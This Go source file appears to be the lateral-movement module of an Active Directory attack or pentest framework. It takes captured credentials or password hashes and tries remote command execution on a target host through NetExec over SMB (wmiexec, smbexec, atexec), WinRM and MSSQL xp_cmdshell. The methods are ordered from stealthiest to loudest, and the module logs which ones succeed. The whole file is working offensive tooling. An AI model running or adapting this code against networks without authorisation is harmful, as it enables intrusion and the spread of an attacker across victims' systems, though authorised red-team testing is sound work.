package modules

import (
	"context"
	"fmt"
	"strings"
	"time"

	"adpack/core"
	"adpack/tools"
	"adpack/utils"
)

// lateralMethod is one row in the lateral-movement matrix. Each row maps a
// human-friendly name to a concrete nxc invocation so that "WMI succeeded"
// and "WinRM succeeded" really mean two different things ran on the wire.
//
// The previous design stuffed five different actions through Method:"command"
// which all routed to the wmiexec→smbexec→atexec failover loop, so any single
// success masqueraded as five.
type lateralMethod struct {
	// Display name for status output ("PSExec via smbexec").
	Name string
	// nxc protocol — smb, winrm, mssql, …
	Protocol string
	// Optional exec method when Protocol == "smb". Empty string means
	// "let nxc choose" (which is wmiexec by default).
	ExecMethod string
}

// lateralMatrix is the canonical lateral-movement probe set. Order is
// stealth-leaning first (wmiexec runs as the auth user, not SYSTEM) →
// loudest last (atexec drops a scheduled task).
var lateralMatrix = []lateralMethod{
	{Name: "SMB-WMI", Protocol: "smb", ExecMethod: "wmiexec"},
	{Name: "SMB-PSExec", Protocol: "smb", ExecMethod: "smbexec"},
	{Name: "SMB-Schtasks", Protocol: "smb", ExecMethod: "atexec"},
	{Name: "WinRM", Protocol: "winrm"},
	{Name: "MSSQL-xpcmd", Protocol: "mssql"},
}

func RunLateral(state *core.ADState, targetHost string) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	host, found := selectTarget(state, targetHost)
	if !found {
		fmt.Println("[!] No target available for lateral movement")
		result.Success = false
		return result
	}

	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No valid credentials for lateral movement")
		result.Success = false
		return result
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	anySuccess := false
	authRejected := false

	for _, m := range lateralMatrix {
		fmt.Printf("[*] Trying %s on %s...\n", m.Name, host.IP)
		ok, evidence, err := probeLateralMethod(ctx, host, domain, user, pass, hash, m)
		if err != nil {
			// Auth-rejected on first probe → no point hammering the rest.
			if strings.Contains(err.Error(), "auth rejected") {
				fmt.Printf("  ✗  %s auth rejected — aborting matrix\n", m.Name)
				authRejected = true
				break
			}
			fmt.Printf("  ✗  %s failed: %v\n", m.Name, err)
			continue
		}
		if !ok {
			fmt.Printf("  ✗  %s did not produce exec evidence\n", m.Name)
			continue
		}
		anySuccess = true
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type:      "lateral_success",
			Phase:     core.PhaseLateral,
			Source:    "netexec_" + strings.ToLower(m.Name) + "_" + host.Domain,
			Key:       host.IP,
			Value:     fmt.Sprintf("%s on %s", m.Name, host.IP),
			RawOutput: evidence,
			Timestamp: time.Now(),
		})
		fmt.Printf("  ✓  %s succeeded\n", m.Name)
	}

	switch {
	case authRejected:
		result.Success = false
	case !anySuccess:
		fmt.Printf("  ✗  All protocols failed\n")
		result.Success = false
	}
	return result
}

// probeLateralMethod runs one row of the matrix. Returns (executed, evidence, err).
//   - err == "auth rejected ..." → caller should abort the whole matrix.
//   - err == any other           → soft per-method failure; try next row.
//   - executed == true           → exec evidence found in stdout/stderr.
func probeLateralMethod(ctx context.Context, host core.Host, domain, user, pass, hash string, m lateralMethod) (bool, string, error) {
	target := tools.NetExecTarget{
		Protocol: m.Protocol, Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	attemptCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	var (
		r   utils.CmdResult
		err error
	)
	switch m.Protocol {
	case "smb":
		args := []string{}
		if m.ExecMethod != "" {
			args = append(args, m.ExecMethod, "-x", "whoami /all")
			r2, e := tools.NetExec.Run(attemptCtx, target, "--exec-method", args)
			r, err = r2, e
		} else {
			r2, e := tools.NetExec.Run(attemptCtx, target, "-x", []string{"whoami"})
			r, err = r2, e
		}
	case "winrm":
		r2, e := tools.NetExec.Run(attemptCtx, target, "-x", []string{"whoami"})
		r, err = r2, e
	case "mssql":
		// xp_cmdshell variant — only succeeds when the principal is sysadmin
		// or has been granted EXECUTE on xp_cmdshell. Otherwise nxc says
		// "[-] not sysadmin" and we report a clean miss.
		r2, e := tools.NetExec.Run(attemptCtx, target, "-q", []string{"xp_cmdshell whoami"})
		r, err = r2, e
	default:
		return false, "", fmt.Errorf("unknown protocol %q", m.Protocol)
	}

	combined := r.Stdout + "\n" + r.Stderr

	// Auth gate: distinguish hard auth failure from generic process error.
	if user != "" && hasAuthFailureMarker(combined, user) {
		return false, "", fmt.Errorf("auth rejected on %s/%s", m.Protocol, host.IP)
	}
	if err != nil {
		return false, combined, err
	}
	if !tools.NxcAuthSucceeded(combined, user) {
		return false, combined, fmt.Errorf("auth banner not positive")
	}
	if !tools.NxcCommandSucceeded(combined) {
		return false, combined, nil
	}
	return true, combined, nil
}

// hasAuthFailureMarker mirrors the failure half of tools.NxcAuthSucceeded so
// the lateral matrix can distinguish "creds wrong" (abort) from
// "method blocked by ACL" (try next).
func hasAuthFailureMarker(out, username string) bool {
	if out == "" || username == "" {
		return false
	}
	for _, line := range strings.Split(out, "\n") {
		if !strings.Contains(line, "[-]") || !strings.Contains(line, username) {
			continue
		}
		lo := strings.ToLower(line)
		for _, m := range []string{
			"status_logon_failure",
			"status_access_denied",
			"status_account_locked",
			"status_account_disabled",
			"status_password_expired",
			"kdc_err_preauth_failed",
			"kdc_err_c_principal_unknown",
			"invalid credentials",
			"authentication failed",
		} {
			if strings.Contains(lo, m) {
				return true
			}
		}
	}
	return false
}
